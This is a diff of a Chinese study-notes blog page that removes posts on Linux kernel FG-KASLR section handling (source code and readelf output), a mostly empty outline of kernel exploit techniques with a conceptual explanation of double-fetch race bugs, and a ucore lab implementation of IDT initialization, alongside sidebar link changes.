-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * now we need to walk through the section headers and collect the</span></span><br><span class="line"><span class="comment"> * sizes of the .text sections to be randomized.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shnum; i++) &#123;</span><br><span class="line">    s = &amp;sechdrs[i];</span><br><span class="line">    sname = secstrings + s-&gt;sh_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;sh_type == SHT_SYMTAB) &#123;</span><br><span class="line">        <span class="comment">/* only one symtab per image */</span></span><br><span class="line">        <span class="keyword">if</span> (symtab)</span><br><span class="line">            error(<span class="string">&quot;Unexpected duplicate symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        symtab = <span class="built_in">malloc</span>(s-&gt;sh_size);</span><br><span class="line">        <span class="keyword">if</span> (!symtab)</span><br><span class="line">            error(<span class="string">&quot;Failed to allocate space for symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(symtab, output + s-&gt;sh_offset, s-&gt;sh_size);</span><br><span class="line">        num_syms = s-&gt;sh_size / <span class="keyword">sizeof</span>(*symtab);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;sh_type == SHT_STRTAB &amp;&amp; i != ehdr-&gt;e_shstrndx) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strtab)</span><br><span class="line">            error(<span class="string">&quot;Unexpected duplicate strtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        strtab = <span class="built_in">malloc</span>(s-&gt;sh_size);</span><br><span class="line">        <span class="keyword">if</span> (!strtab)</span><br><span class="line">            error(<span class="string">&quot;Failed to allocate space for strtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(strtab, output + s-&gt;sh_offset, s-&gt;sh_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (text)</span><br><span class="line">            error(<span class="string">&quot;Unexpected duplicate .text section&quot;</span>);</span><br><span class="line"></span><br><span class="line">        text = s;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.data..percpu&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* get start addr for later */</span></span><br><span class="line">        percpu = s;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(s-&gt;sh_flags &amp; SHF_ALLOC) ||</span><br><span class="line">        !(s-&gt;sh_flags &amp; SHF_EXECINSTR) ||</span><br><span class="line">        !(strstarts(sname, <span class="string">&quot;.text&quot;</span>)))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    sections[num_sections] = s;</span><br><span class="line"></span><br><span class="line">    num_sections++;</span><br><span class="line">&#125;</span><br><span class="line">sections[num_sections] = <span class="literal">NULL</span>;</span><br><span class="line">sections_size = num_sections;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，只有同时满足以下条件的节区才会参与随机化</p>
-<ul>
-<li>节区名以 .text 开头</li>
-<li>section flags 中包含<code>SHF_ALLOC</code></li>
-<li>section flags 中包含<code>SHF_EXECINSTR</code></li>
-</ul>
-<p>因此，通过以下命令，我们可以知道</p>
-<ul>
-<li>__ksymtab 不会参与随机化</li>
-<li>.data 不会参与随机化</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&gt; readelf --section-headers -W vmlinux| grep -vE &quot; .text|AX&quot;</span><br><span class="line">...</span><br><span class="line">  [36106] .rodata           PROGBITS        ffffffff81c00000 e1e000 382241 00  WA  0   0 4096</span><br><span class="line">  [36107] .pci_fixup        PROGBITS        ffffffff81f82250 11a0250 002ed0 00   A  0   0 16</span><br><span class="line">  [36108] .tracedata        PROGBITS        ffffffff81f85120 11a3120 000078 00   A  0   0  1</span><br><span class="line">  [36109] __ksymtab         PROGBITS        ffffffff81f85198 11a3198 00b424 00   A  0   0  4</span><br><span class="line">  [36110] __ksymtab_gpl     PROGBITS        ffffffff81f905bc 11ae5bc 00dab8 00   A  0   0  4</span><br><span class="line">  [36111] __ksymtab_strings PROGBITS        ffffffff81f9e074 11bc074 027a82 01 AMS  0   0  1</span><br><span class="line">  [36112] __init_rodata     PROGBITS        ffffffff81fc5b00 11e3b00 000230 00   A  0   0 32</span><br><span class="line">  [36113] __param           PROGBITS        ffffffff81fc5d30 11e3d30 002990 00   A  0   0  8</span><br><span class="line">  [36114] __modver          PROGBITS        ffffffff81fc86c0 11e66c0 000078 00   A  0   0  8</span><br><span class="line">  [36115] __ex_table        PROGBITS        ffffffff81fc8740 11e6738 001c50 00   A  0   0  4</span><br><span class="line">  [36116] .notes            NOTE            ffffffff81fca390 11e8388 0001ec 00   A  0   0  4</span><br><span class="line">  [36117] .data             PROGBITS        ffffffff82000000 11ea000 215d80 00  WA  0   0 8192</span><br><span class="line">  [36118] __bug_table       PROGBITS        ffffffff82215d80 13ffd80 01134c 00  WA  0   0  1</span><br><span class="line">  [36119] .vvar             PROGBITS        ffffffff82228000 14110d0 001000 00  WA  0   0 16</span><br><span class="line">  [36120] .data..percpu     PROGBITS        0000000000000000 1413000 02e000 00  WA  0   0 4096</span><br><span class="line">  [36122] .rela.init.text   RELA            0000000000000000 149eec0 000180 18   I 36137 36121  8</span><br><span class="line">  [36124] .init.data        PROGBITS        ffffffff822b6000 14a0000 18d1a0 00  WA  0   0 8192</span><br><span class="line">  [36125] .x86_cpu_dev.init PROGBITS        ffffffff824431a0 162d1a0 000028 00   A  0   0  8</span><br><span class="line">  [36126] .parainstructions PROGBITS        ffffffff824431c8 162d1c8 01e04c 00   A  0   0  8</span><br><span class="line">  [36127] .altinstructions  PROGBITS        ffffffff82461218 164b214 003a9a 00   A  0   0  1</span><br><span class="line">  [36129] .iommu_table      PROGBITS        ffffffff82465bb0 164fbb0 0000a0 00   A  0   0  8</span><br><span class="line">  [36130] .apicdrivers      PROGBITS        ffffffff82465c50 164fc50 000038 00  WA  0   0  8</span><br><span class="line">  [36132] .smp_locks        PROGBITS        ffffffff82468000 1651610 007000 00   A  0   0  4</span><br><span class="line">  [36133] .data_nosave      PROGBITS        ffffffff8246f000 1658610 001000 00  WA  0   0  4</span><br><span class="line">  [36134] .bss              NOBITS          ffffffff82470000 165a000 590000 00  WA  0   0 4096</span><br><span class="line">  [36135] .brk              NOBITS          ffffffff82a00000 1659610 02c000 00  WA  0   0  1</span><br><span class="line">  [36136] .init.scratch     PROGBITS        ffffffff82c00000 1659620 400000 00  WA  0   0 32</span><br><span class="line">  [36137] .symtab           SYMTAB          0000000000000000 1a59620 30abd8 18     36138 111196  8</span><br><span class="line">  [36138] .strtab           STRTAB          0000000000000000 1d641f8 219a29 00      0   0  1</span><br><span class="line">  [36139] .shstrtab         STRTAB          0000000000000000 1f7dc21 0ed17b 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Exploit-Method"><a href="#Exploit-Method" class="headerlink" title="Exploit Method"></a>Exploit Method</h2><h3 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h3><h3 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h3><h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><h3 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass-SMEP"></a>bypass-SMEP</h3><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double-Fetch"></a>Double-Fetch</h3><blockquote>
-<p>double-fetch从漏洞原理上属于<strong>条件竞争漏洞</strong>，是一种<strong>内核态</strong>与<strong>用户态</strong>之间的<strong>数据访问竞争</strong>。</p>
-</blockquote>
-<p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将<strong>用户数据拷贝至内核空间</strong>进行校验及相关处理，但在<strong>输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间</strong>进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</p>
-<p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该<strong>数据在内核中有两次被取用</strong>，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可<strong>创造条件竞争，对已通过检查的用户态数据进行篡改</strong>，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
-<p><img src="/CTF/PWN/kernel-pwn/knowledge/basic-knowledge/double-fetch.jpg" alt="double-fetch"></p>
-<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><h2 id="Not-Only-CTF-Kernel"><a href="#Not-Only-CTF-Kernel" class="headerlink" title="Not Only CTF Kernel"></a>Not Only CTF Kernel</h2><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><h3 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h3><h3 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h3><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><h3 id="内存管理系统"><a href="#内存管理系统" class="headerlink" title="内存管理系统"></a>内存管理系统</h3><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><h3 id="内核组件"><a href="#内核组件" class="headerlink" title="内核组件"></a>内核组件</h3><h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><h3 id="认证机制"><a href="#认证机制" class="headerlink" title="认证机制"></a>认证机制</h3>
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
-  <article id="post-challenge6-2-init-IDT" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/OS/lab1/challenge6-interrupt-handle/challenge6-2-init-IDT/">challenge6.2:init_IDT</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-11T08:29:54.000Z" itemprop="datePublished">2021年11月11日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/OS/">OS</a> > <a class="article-category-link" href="/categories/OS/lab1/">lab1</a> > <a class="article-category-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a>
-  </div>
-
-      
-      
-<a href="/OS/lab1/challenge6-interrupt-handle/challenge6-2-init-IDT/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="challenge6-2-init-IDT"><a href="#challenge6-2-init-IDT" class="headerlink" title="challenge6.2:init IDT"></a>challenge6.2:init IDT</h1><p>编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* LAB1 YOUR CODE : STEP 2 */</span></span><br><span class="line">    <span class="comment">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?</span></span><br><span class="line"><span class="comment">      *     All ISR&#x27;s entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?</span></span><br><span class="line"><span class="comment">      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c</span></span><br><span class="line"><span class="comment">      *     (try &quot;make&quot; command in lab1, then you will find vector.S in kern/trap DIR)</span></span><br><span class="line"><span class="comment">      *     You can use  &quot;extern uintptr_t __vectors[];&quot; to define this extern variable which will be used later.</span></span><br><span class="line"><span class="comment">      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).</span></span><br><span class="line"><span class="comment">      *     Can you see idt[256] in this file? Yes, it&#x27;s IDT! you can use SETGATE macro to setup each item of IDT</span></span><br><span class="line"><span class="comment">      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using &#x27;lidt&#x27; instruction.</span></span><br><span class="line"><span class="comment">      *     You don&#x27;t know the meaning of this instruction? just google it! and check the libs/x86.h to know more.</span></span><br><span class="line"><span class="comment">      *     Notice: the argument of lidt is idt_pd. try to find it!</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">// 入口数=idt大小/gatedesc结构化大小</span></span><br><span class="line">    <span class="comment">// idt = n * gatedesc</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(idt) / <span class="keyword">sizeof</span>(struct gatedesc); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        #define SETGATE(gate, istrap, sel, off, dpl) &#123;            \</span></span><br><span class="line"><span class="comment">          (gate).gd_off_15_0 = (uint32_t)(off) &amp; 0xffff;        \</span></span><br><span class="line"><span class="comment">          (gate).gd_ss = (sel);                                \</span></span><br><span class="line"><span class="comment">          (gate).gd_args = 0;                                    \</span></span><br><span class="line"><span class="comment">          (gate).gd_rsv1 = 0;                                    \</span></span><br><span class="line"><span class="comment">          (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \</span></span><br><span class="line"><span class="comment">          (gate).gd_s = 0;                                    \</span></span><br><span class="line"><span class="comment">          (gate).gd_dpl = (dpl);                                \</span></span><br><span class="line"><span class="comment">          (gate).gd_p = 1;                                    \</span></span><br><span class="line"><span class="comment">          (gate).gd_off_31_16 = (uint32_t)(off) &gt;&gt; 16;        \</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 为每一个entry设置gate属性</span></span><br><span class="line">        SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置用户态到内核的开关</span></span><br><span class="line">    SETGATE(idt[T_SWITCH_TOK], <span class="number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span><br><span class="line">    <span class="comment">// 装载</span></span><br><span class="line">    lidt(&amp;idt_pd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>在kern/mm/memlayout.h中，对内核权限和用户态权限的定义；</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DPL_KERNEL  (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DPL_USER    (3)</span></span><br></pre></td></tr></table></figure>
-
-
-<p>在kern/trap/trap.h中，对开关的定义；</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_SWITCH_TOU                120    <span class="comment">// user/kernel switch</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_SWITCH_TOK                121    <span class="comment">// user/kernel switch</span></span></span><br></pre></td></tr></table></figure>
-
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
 
     <nav id="page-nav">
 
-<a class="extend prev" rel="prev" href="/page/6/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">下一页</a>
+<a class="extend prev" rel="prev" href="/page/6/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/8/">下一页</a>
 </nav>
 
 
@@ -1747,6 +1295,14 @@
       <ul>
         
           <li>
+            <a href="/OS/theory/OS-01-summary/">OS_01_summary</a>
+          </li>
+        
+          <li>
+            <a href="/OS/Prepare/OS-prepare/">OS_prepare</a>
+          </li>
+        
+          <li>
             <a href="/course/static-program-analysis/static-program-analysis-05-interprocedural-analysis/">static_program_analysis_05_interprocedural_analysis</a>
           </li>
         
@@ -1756,14 +1312,6 @@
         
           <li>
             <a href="/CTF/PWN/wp/susctf2022/ctf-susctf2022-happytree/">ctf_susctf2022_happytree</a>
-          </li>
-        
-          <li>
-            <a href="/CTF/PWN/wp/susctf2022/ctf-susctf2022-rain/">ctf_susctf2022_rain</a>
-          </li>
-        
-          <li>
-            <a href="/course/static-program-analysis/static-program-analysis-04-data-flow-analysis-foundations/">static_program_analysis_04_data_flow_analysis_foundations</a>
           </li>
         
       </ul>
@@ -1778,7 +1326,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-classify"></i> 分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/susctf2022/">susctf2022</a><span class="category-list-count">2</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/microcorruption/">microcorruption</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/">UE4</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/LowPoly/">LowPoly</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/static-program-analysis/">static_program_analysis</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/golang/start/">start</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/">pwn.college</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter01-Program-interaction/">Chapter01 Program interaction</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter02-Binary-file/">Chapter02 Binary file</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Introduciton/">Introduciton</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" 